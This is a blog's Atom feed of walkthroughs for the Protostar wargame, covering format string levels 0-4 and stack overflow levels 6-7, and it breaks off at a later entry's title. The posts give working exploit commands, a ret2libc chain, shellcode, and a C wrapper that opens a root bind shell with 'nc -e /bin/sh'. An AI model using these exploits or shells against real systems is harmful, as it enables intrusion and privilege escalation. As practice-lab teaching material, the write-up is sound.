<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: exploits | Louis Li]]></title>
  <link href="http://louisrli.github.io/blog/categories/exploits/atom.xml" rel="self"/>
  <link href="http://louisrli.github.io/"/>
  <updated>2020-10-09T18:20:37+01:00</updated>
  <id>http://louisrli.github.io/</id>
  <author>
    <name><![CDATA[Louis Li]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Protostar Format String Exploits (Solutions 0-4)]]></title>
    <link href="http://louisrli.github.io/blog/2012/08/29/protostar-format0/"/>
    <updated>2012-08-29 00:00:00 +0100</updated>
    <id>http://louisrli.github.io/blog/2012/08/29/protostar-format0</id>
    <content type="html"><![CDATA[<h1 id="overview">Overview</h1>
<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>

<p>This post contains solutions and walkthroughs for the four format string levels (“Format”).</p>

<h1 id="solutions">Solutions</h1>
<h2 id="format-level-0">Format: Level 0</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format0">full</a>): Change the value of a stack variable to <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> using less than 10 bytes of input.</p>

<p>This exploit shows similarities (sometimes) between format string exploits and buffer overflows.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>./format0 %64s<span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\xef\xbe\xad\xde"'</span><span class="si">)</span>
<span class="go">
you have hit the target correctly :)</span></code></pre></figure>

<!-- more -->
<h2 id="format-level-1">Format: Level 1</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format1">full</a>): Change the value of a global variable, <code class="language-plaintext highlighter-rouge">target</code>, to any nonzero value.</p>

<p><code class="language-plaintext highlighter-rouge">target</code> is a global variable. To overwrite it, we first find its address using <code class="language-plaintext highlighter-rouge">obdjump -t</code> (we could also use <code class="language-plaintext highlighter-rouge">nm</code> to save some keystrokes).</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>objdump <span class="nt">-t</span> format1 | <span class="nb">grep </span>target
<span class="go">08049638 g       0 .bss    00000004            target</span></code></pre></figure>

<p>Next, we need to find where the format function expects the first (missing) argument to the format string.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">Starting program: /opt/protostar/bin/format1 AAAA%08x

Breakpoint 1, __printf (format=0xbffff98f "AAAA%08x") at printf.c:29
29      printf.c: No such file or directory.
in printf.c
(gdb) x/10xw $esp
0xbffff768:     0x00000002      0xb7edcf90      0xb7edcf99      0xb7fd6ff4
0xbffff778:     0xbffff798      0x08048405      0xbffff98f      0x0804960c
0xbffff788:     0xbffff7b8      0x08048469
(gdb) x/xw 0xbffff784
0xbffff784:     0x0804960c
(gdb) p 0xbffff98f - 0x0bffff784
$1 = 523</code></pre></figure>

<p>An important detail: adding <em>n</em> characters will actually decrease the starting address of the string’s characters by <em>n</em> bytes. Adding one more character decrements the address from <code class="language-plaintext highlighter-rouge">0xbffff98f</code> to <code class="language-plaintext highlighter-rouge">0xbffff98e</code>. This leaves the location of the first parameter unchanged.</p>

<p>Remember that the offset is calculated <em>relative to the format function</em> (i.e. <code class="language-plaintext highlighter-rouge">printf</code>) rather than <code class="language-plaintext highlighter-rouge">vuln()</code>.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">(gdb) run AAAAA%08x
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/format1 AAAAA%08x

Breakpoint 1, __printf (format=0xbffff98e "AAAAA%08x") at printf.c:29
29      printf.c: No such file or directory.
in printf.c
(gdb) x/xw 0xbffff784
0xbffff784:     0x0804960c</code></pre></figure>

<ul>
  <li><code class="language-plaintext highlighter-rouge">0xbffff784</code>: The first argument to the format string.</li>
  <li><code class="language-plaintext highlighter-rouge">0xbffff997 - n</code>: The first character of the format string, where <code class="language-plaintext highlighter-rouge">n</code> is the total number of characters in the string. The odd alignment is caused by the null byte.</li>
</ul>

<p>As seen earlier, the distance between the beginning of the format string (the address of <code class="language-plaintext highlighter-rouge">target</code>) and the first argument to the format string (a starting address for “stack popping” additional arguments) is about 500 bytes.</p>

<p>With a few calculations, we can find the correct offset.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>./format1 <span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\x38\x96\x04\x08"'</span><span class="si">)</span><span class="s1">'..%128$n'</span>
<span class="go">8..you have modified the target :)</span></code></pre></figure>

<h2 id="format-level-2">Format: Level 2</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format3">full</a>): Change the value of a global variable, <code class="language-plaintext highlighter-rouge">target</code>, to <code class="language-plaintext highlighter-rouge">0x40</code>.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>objdump <span class="nt">-t</span> format2 | <span class="nb">grep </span>target
<span class="go">080496e4 g     O .bss   00000004              target</span></code></pre></figure>

<p>Using the same techniques as before, we find the beginning of the format string in memory. The fourth expected format string argument coincides with the beginning of the format string in memory. We store our target address at the beginning of the format string in order to write to it.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\xe4\x96\x04\x08"'</span><span class="si">)</span>%4<span class="se">\$</span>08x | ./format2
<span class="go">080496e4target is 0 :(</span></code></pre></figure>

<p>Finally, we calculate the number of bytes needed to write 64 (0x40). The address of <code class="language-plaintext highlighter-rouge">target</code> occupies four bytes first, and we need another 60 bytes.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\xe4\x96\x04\x08"'</span><span class="si">)</span>%60u%4<span class="se">\$</span>n | ./format2
<span class="go">                                                         512you have modified the target :)</span></code></pre></figure>

<h2 id="format-level-3">Format: Level 3</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format3">full</a>): Change the value of a global variable, <code class="language-plaintext highlighter-rouge">target</code>, to <code class="language-plaintext highlighter-rouge">0x01025544</code>.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>objdump <span class="nt">-t</span> format3 | <span class="nb">grep </span>target
<span class="go">080496f4 g     O .bss   00000004              target</span></code></pre></figure>

<p>We calculate the offset between the format function parameters and the characters of the string in the same way as the previous exercises.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">(gdb) break printf
Breakpoint 1 at 0x804837c
(gdb) run
Starting program: /opt/protostar/bin/format3
AAAA
Breakpoint 1, __printf (format=0xbffff5a0 "AAAA\n") at printf.c:29
29      printf.c: No such file or directory.
in printf.c
(gdb) info frame
Stack level 0, frame at 0xbffff570:
eip = 0xb7edcfa2 in __printf (printf.c:29); saved eip 0x8048465
called by frame at 0xbffff590
source language c.
Arglist at 0xbffff568, args: format=0xbffff5a0 "AAAA\n"
Locals at 0xbffff568, Previous frame's sp is 0xbffff570
Saved registers:
ebx at 0xbffff564, ebp at 0xbffff568, eip at 0xbffff56c
(gdb) x/3xw 0xbffff568
0xbffff568:     0xbffff588      0x08048465      0xbffff5a0
(gdb) x/w 0xbffff570
0xbffff570:     0xbffff5a0
(gdb) p 0xbffff5a0 - 0xbffff570
= 48</code></pre></figure>

<p>We can confirm that our offset of 48 (12 * 4 bytes) is correct.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo </span>AAAA%12<span class="se">\$</span>x | ./format3
<span class="go">AAAA41414141
target is 00000000 :(</span></code></pre></figure>

<p>Next, we need to change the value of target to <code class="language-plaintext highlighter-rouge">0x01025544</code>. Below is each byte in decimal:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"ibase=16; 44"</span> | bc
<span class="go">68
</span><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"ibase=16; 55"</span> | bc
<span class="go">85
</span><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"ibase=16; 02"</span> | bc
<span class="go">2
</span><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"ibase=16; 01"</span> | bc
<span class="go">1</span></code></pre></figure>

<p>Finally, we write values to each of the four bytes of <code class="language-plaintext highlighter-rouge">target</code>:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\xf4\x96\x04\x08"'</span><span class="si">)$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\xf5\x96\x04\x08"'</span><span class="si">)$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\xf6\x96\x04\x08"'</span><span class="si">)$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\xf7\x96\x04\x08"'</span><span class="si">)</span><span class="s1">'%52u%12$n%''17u%13$n''%173u%14$n'</span> | ./format3
<span class="go">���                                                   0       3221222848                                                                                                                                                                   3086839796
you have modified the target :))</span></code></pre></figure>

<p>Note that it wasn’t necessary to include the last address, <code class="language-plaintext highlighter-rouge">0x080496f7</code>, since the most significant byte (<code class="language-plaintext highlighter-rouge">0x01</code>) is written as a consequence of the overflow.</p>

<h2 id="format-level-4">Format: Level 4</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format4">full</a>): Redirect execution flow to <code class="language-plaintext highlighter-rouge">hello()</code> by using a format string exploit.</p>

<p>In this exercise, the offset is only 16 bytes (four parameter arguments). The calculation is omitted as the two previous exercises illustrate the process.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'AAAA%4$x'</span> | ./format4
<span class="go">AAAA41414141</span></code></pre></figure>

<p>In order to perform this exploit, we’ll <a href="http://www.stanford.edu/~stinson/cs155/rdg/rdg_list.txt">overwrite an entry in global offset table</a>. Specifically, we’ll overwrite the entry of the <code class="language-plaintext highlighter-rouge">exit()</code> function (<code class="language-plaintext highlighter-rouge">0x08049724</code>) with the address of the <code class="language-plaintext highlighter-rouge">hello()</code> function (<code class="language-plaintext highlighter-rouge">0x08048b4</code>).</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>objdump <span class="nt">-TR</span> format4 | <span class="nb">grep exit</span>
<span class="go">00000000      DF *UND* 00000000  GLIBC_2.0   _exit
00000000      DF *UND*  00000000  GLIBC_2.0   exit
08049718 R_386_JUMP_SLOT   _exit
08049724 R_386_JUMP_SLOT   exit
</span><span class="gp">$</span><span class="w"> </span>objdump <span class="nt">-t</span> format4 | <span class="nb">grep </span>hello
<span class="go">080484b4 g     F .text  0000001e              hello</span></code></pre></figure>

<p>To confirm that our overwrite works correctly, we run a quick test:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\x24\x97\x04\x08"'</span><span class="si">)</span><span class="s1">'%4$n'</span> <span class="o">&gt;</span> /tmp/format4
<span class="gp">$</span><span class="w"> </span>gdb <span class="nt">-q</span> format4
<span class="go">Reading symbols from /opt/protostar/bin/format4...done.
(gdb) run &lt; /tmp/format4
Starting program: /opt/protostar/bin/format4 &lt; /tmp/format4
</span><span class="gp">$</span>�
<span class="go">Program received signal SIGSEGV, Segmentation fault.
0x00000004 in ?? ()</span></code></pre></figure>

<p>Execution jumped to the address <code class="language-plaintext highlighter-rouge">0x00000004</code>, meaning that we’re on the right track. Finally, we use a <strong>short write</strong> (<code class="language-plaintext highlighter-rouge">%hn</code>, allowing us to write to two bytes) to overwrite the last two bytes of the GOT entry. This works because both addresses start with <code class="language-plaintext highlighter-rouge">0x0804</code> – only the last two bytes need to be changed.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\x24\x97\x04\x08"'</span><span class="si">)</span><span class="s1">'%33968u%4$hn'</span> | ./format4
<span class="gp">$</span><span class="w">
</span><span class="gp">&lt;lots of whitespace&gt;</span><span class="w">
</span><span class="go">512
                                                                                                                                                                              code execution redirected! you win</span></code></pre></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 6-7)]]></title>
    <link href="http://louisrli.github.io/blog/2012/08/28/protostar-stack2/"/>
    <updated>2012-08-28 00:00:00 +0100</updated>
    <id>http://louisrli.github.io/blog/2012/08/28/protostar-stack2</id>
    <content type="html"><![CDATA[<h1 id="overview">Overview</h1>
<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>

<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (“Stack”). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the final post for Stack.</p>

<h1 id="solutions">Solutions</h1>
<h2 id="stack-6">Stack 6</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack6">full</a>): Execute shellcode with a restriction on the return address. This mimics a nonexecutable stack by barring any return addresses of the form <code class="language-plaintext highlighter-rouge">0xbfxxxxxx</code>.</p>

<h3 id="utilities">Utilities</h3>
<p>We’ll add one more script to our utility belt. This will help us quickly make guesses for buffer overflows.</p>

<p><code class="language-plaintext highlighter-rouge">~/try-address.sh</code>:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
<span class="c"># Takes an offset and unlimited 4-byte addresses and prints it in little-endian order</span>
<span class="k">if</span> <span class="o">[[</span> <span class="nv">$# </span><span class="nt">-lt</span> 2 <span class="o">]]</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="s2">"usage: </span><span class="nv">$0</span><span class="s2"> OFFSET ADDRESS. Example: </span><span class="nv">$0</span><span class="s2"> 80 0xdeadbeef 0xf00f00f0"</span>
    <span class="nb">exit </span>1
<span class="k">fi

</span>perl <span class="nt">-e</span> <span class="s2">"print 'A'x</span><span class="nv">$1</span><span class="s2">"</span>
<span class="nb">shift
</span><span class="k">for </span>addr <span class="k">in</span> <span class="nv">$@</span><span class="p">;</span> <span class="k">do
    for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>8 <span class="nt">-2</span> 2<span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\x</span><span class="k">${</span><span class="nv">addr</span>:<span class="nv">$i</span>:2<span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">done
done</span></code></pre></figure>

<!-- more -->
<h3 id="solution">Solution</h3>
<p>First, we need to find the proper offset for overwriting the return address. The command below reveals that the return address is 16 bytes after the end of the 64 byte buffer, meaning that 80 bytes are needed before overwriting the return address.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>76 4 100<span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nv">$i</span><span class="p">;</span> ~/try-address.sh <span class="nv">$i</span> 0xbfffffff | ./stack6<span class="p">;</span> <span class="k">done</span>
<span class="go">76
</span><span class="c">...
</span><span class="go">80
input path please: bzzzt (0xbfffffff)
84
</span><span class="c">...</span></code></pre></figure>

<p>For our solution, we’ll be performing a <strong><a href="http://en.wikipedia.org/wiki/Return-to-libc_attack">ret2libc</a></strong> attack. <a href="http://shellblade.net/docs/ret2libc.pdf">This paper</a> by InVoLuNTaRy offers an in-depth description of the tactic (sidenote: it’s one of the most well-written papers that I’ve ever read and well worth the read). The rest of this section assumes that this paper has been read.</p>

<p>First, we find the addresses of the <code class="language-plaintext highlighter-rouge">system()</code> and <code class="language-plaintext highlighter-rouge">exit()</code> libc functions. <code class="language-plaintext highlighter-rouge">exit()</code> isn’t strictly necessary, but since ret2libc ultimately calls two functions, we prefer to return without a segmentation fault.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>gdb <span class="nt">-q</span> stack6
<span class="go">Reading symbols from /opt/protostar/bin/stack6...done.
(gdb) break main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
(gdb) run
Starting program: /opt/protostar/bin/stack6

Breakpoint 1, main (argc=1, argv=0xbffff874) at stack6/stack6.c:27
27      stack6/stack6.c: No such file or directory.
in stack6/stack6.c
(gdb) print system
</span><span class="gp">$</span>1 <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7ecefb0 &lt;__libc_system&gt;
<span class="go">(gdb) print exit
</span><span class="gp">$</span>2 <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7ec50c0 &lt;<span class="k">*</span>__GI_exit&gt;</code></pre></figure>

<p>We see that our functions have the following addresses:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">system()</code>: <code class="language-plaintext highlighter-rouge">0xb7ecefb0</code></li>
  <li><code class="language-plaintext highlighter-rouge">exit()</code>: <code class="language-plaintext highlighter-rouge">0xb7ec50c0</code></li>
</ul>

<p>Given the particular stack layout for a ret2libc attack (described in the InVoLuNTaRy paper), our solution will be of the form:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>~/try-address.sh 80 <span class="o">(</span>ENV_VAR_ADDRESS<span class="o">)</span> <span class="o">(</span>EXIT<span class="o">()</span>_ADDRESS<span class="o">)</span> <span class="o">(</span>SYSTEM<span class="o">()</span>_ADDRESS<span class="o">)</span></code></pre></figure>

<h4 id="sanity-checks">Sanity checks</h4>
<p>First, let’s make sure that we can actually execute code.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">TEST</span><span class="o">=</span><span class="nb">whoami</span>
<span class="gp">$</span><span class="w"> </span>/home/user/try-address.sh 80 0xb7ecefb0 0xb7ec50c0 0xbfffff8a | ./stack6
<span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췊���
sh: =whoami: not found
</span><span class="gp">$</span><span class="w"> </span>/home/user/try-address.sh 80 0xb7ecefb0 0xb7ec50c0 0xbfffff8b | ./stack6
<span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췋���
root</span></code></pre></figure>

<h4 id="working-netcat-solution">Working netcat solution</h4>
<p>There are two obstacles to a working solution.</p>

<ol>
  <li>Environmental variables with spaces don’t work. All of the following would fail:</li>
</ol>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">RUN</span><span class="o">=</span><span class="s2">"nc -lp8080 -e/bin/sh"</span>
<span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">RUN</span><span class="o">=</span><span class="s2">"cat /etc/shadow"</span>
<span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">RUN</span><span class="o">=</span><span class="s2">"</span><span class="se">\"</span><span class="s2">cat /etc/shadow</span><span class="se">\"</span><span class="s2">"</span></code></pre></figure>

<ol>
  <li><code class="language-plaintext highlighter-rouge">system()</code> will drop our root privileges (<a href="http://linux.die.net/man/3/system">man system</a>)</li>
</ol>

<p>Instead, we can wrap our call to netcat in another C program, naming an executable without spaces and restoring our privileges.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdlib.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// These two are necessary, as system() drops privileges</span>
    <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>  <span class="s">"nc"</span><span class="p">,</span> <span class="s">"-lp8080"</span><span class="p">,</span> <span class="s">"-e/bin/sh"</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/nc"</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>gcc ~/netcat.c <span class="nt">-o</span> ~/netcat
<span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">RUN</span><span class="o">=</span>/////////////////////////////////////home/user/netcat   <span class="c"># The slashes are similar to a NOP sled</span>
<span class="gp">$</span><span class="w"> </span>~/envaddr RUN
<span class="go">RUN is at address 0xbfffff9e
</span><span class="gp">$</span><span class="w"> </span>/home/user/try-address.sh 80 0xb7ecefb0 0xb7ec50c0 0xbfffff9e | ./stack6
<span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췞���
sh: 192.168.1.10: not found</span></code></pre></figure>

<p><code class="language-plaintext highlighter-rouge">system()</code> doesn’t seem to be using the contents of our environmental variable. If we look at the environmental variables, though, we see that we were close enough: <code class="language-plaintext highlighter-rouge">RUN</code> is the next variable. We then adjust our estimate for the address of <code class="language-plaintext highlighter-rouge">RUN</code> by 20 bytes.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">env</span>
<span class="c">...
</span><span class="go">HOME=/home/user
LOGNAME=user
SSH_CONNECTION=192.168.1.7 49324 192.168.1.10 22
RUN=/////////////////////////////////////home/user/netcat
_=/usr/bin/env
</span><span class="gp">$</span><span class="w"> </span>/home/user/try-address.sh 80 0xb7ecefb0 0xb7ec50c0 0xbfffffbe | ./stack6
<span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췳���
</span><span class="gp">&lt;waiting&gt;</span></code></pre></figure>

<p>Finally, through a remote machine:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="o">[</span>louis@neutrino ~]<span class="nv">$ </span>nc 192.168.1.10 8080
<span class="go">whoami
root</span></code></pre></figure>

<h2 id="stack-level-7">Stack: Level 7</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack7">full</a>): Execute shellcode with further restrictions on the return address. Any address of the form <code class="language-plaintext highlighter-rouge">0xbxxxxxxx</code> raises an error.</p>

<h3 id="overview-1">Overview</h3>

<p>The return value of a function is usually stored in the <code class="language-plaintext highlighter-rouge">eax</code> register. The key to this level is the call to <code class="language-plaintext highlighter-rouge">return strdup(buf)</code>: this means we can find the buffer (e.g. our shellcode) in the <code class="language-plaintext highlighter-rouge">eax</code> register when <code class="language-plaintext highlighter-rouge">getpath()</code> returns.</p>

<p>The code restricts us from returning to any code on the bottom of the stack (<code class="language-plaintext highlighter-rouge">0xbxxxxxxx</code>) and advises us to return to the <code class="language-plaintext highlighter-rouge">.text</code> section. In particular, we’ll want to return to a <code class="language-plaintext highlighter-rouge">call eax</code> instruction, which will then call our shellcode.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>objdump <span class="nt">-M</span> intel <span class="nt">-d</span> stack7 | <span class="nb">grep</span> <span class="s2">"call.*eax"</span>
<span class="go">8048478:       ff 14 85 5c 96 04 08    call   DWORD PTR [eax*4+0x804965c]
80484bf:       ff d0                   call   eax
80485eb:       ff d0                   call   eax</span></code></pre></figure>

<p>If we play with the numbers like in earlier levels, we’ll find that 80 bytes are needed before the return address. Our buffer overflow will look like this:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">Buffer start
      | ---------- Shellcode (n bytes) --------- |
      | -------- Padding (80 - n bytes) -------- |
      | -- Return address 0x80484bf (4 bytes) -- |
Buffer end (84 bytes total)</code></pre></figure>

<h3 id="solution-1">Solution</h3>
<p>In earlier levels, we found that opening a shell with <code class="language-plaintext highlighter-rouge">gets()</code>. However, we can still use it to validate our strategy:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="si">$(</span><span class="nb">cat</span> ~/shell<span class="si">)$(</span>~/try-address.sh 49 0x080484bf<span class="si">)</span> | <span class="nb">wc</span> <span class="nt">-c</span>
<span class="go">84
</span><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="si">$(</span><span class="nb">cat</span> ~/shell<span class="si">)$(</span>~/try-address.sh 49 0x080484bf<span class="si">)</span> <span class="o">&gt;</span> /tmp/stack7shell
<span class="gp">$</span><span class="w"> </span>gdb <span class="nt">-q</span> stack7
<span class="go">Reading symbols from /opt/protostar/bin/stack7...done.
(gdb) run &lt; /tmp/stack7shell
Starting program: /opt/protostar/bin/stack7 &lt; /tmp/stack7shell
input path please: got path ����1�Ph//shh/bin��h-ilsP�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA��
Executing new program: /bin/dash

Program exited normally.</span></code></pre></figure>

<p>If we give it a shot with our <code class="language-plaintext highlighter-rouge">nc</code> shellcode, we’ll find the following error: <code class="language-plaintext highlighter-rouge">bin/sh: forward host lookup failed: Unknown host</code>. This occurs as a complication from having options passed into the <code class="language-plaintext highlighter-rouge">execve</code> call.</p>

<p>We can add another wrapper to the <code class="language-plaintext highlighter-rouge">netcat.c</code> used in Level 6 by writing our own shellcode. This shellcode will simply execute <code class="language-plaintext highlighter-rouge">/tmp/nc</code>, an alias for a compiled <code class="language-plaintext highlighter-rouge">netcat.c</code>. This file, in turn, calls netcat and listens via port 8080.</p>

<p><code class="language-plaintext highlighter-rouge">~/sc-tmp-nc.asm</code>:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="k">BITS</span> <span class="mi">32</span>

<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
<span class="nf">push</span> <span class="nb">eax</span>
<span class="nf">push</span> <span class="mh">0x636e2f2f</span>         <span class="c1">; //nc</span>
<span class="nf">push</span> <span class="mh">0x706d742f</span>         <span class="c1">; /tmp</span>
<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
<span class="nf">push</span> <span class="nb">eax</span>
<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">esp</span>
<span class="nf">push</span> <span class="nb">ebx</span>
<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>              <span class="c1">; execve()</span>
<span class="nf">int</span> <span class="mh">0x80</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>nasm ~/sc-tmp-nc.asm
<span class="gp">$</span><span class="w"> </span>gcc ~/netcat.c <span class="nt">-o</span> ~/netcat
<span class="gp">$</span><span class="w"> </span><span class="nb">cp</span> /home/user/netcat /tmp/nc
<span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /home/user/sc-tmp-nc | <span class="nb">wc</span> <span class="nt">-c</span>
<span class="go">25
got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
</span><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="si">$(</span><span class="nb">cat</span> ~/sc-tmp-nc<span class="si">)$(</span>~/try-address.sh 55 0x080484bf<span class="si">)</span> | ./stack7
<span class="go">input path please: got path 1�Ph//nch/tmp���̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA��
</span><span class="gp">&lt;waiting&gt;</span></code></pre></figure>

<p>On a remote machine:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="o">[</span>louis@neutrino ~]<span class="nv">$ </span>nc 192.168.1.10 8080
<span class="go">whoami
root</span></code></pre></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 4-5)]]></title>
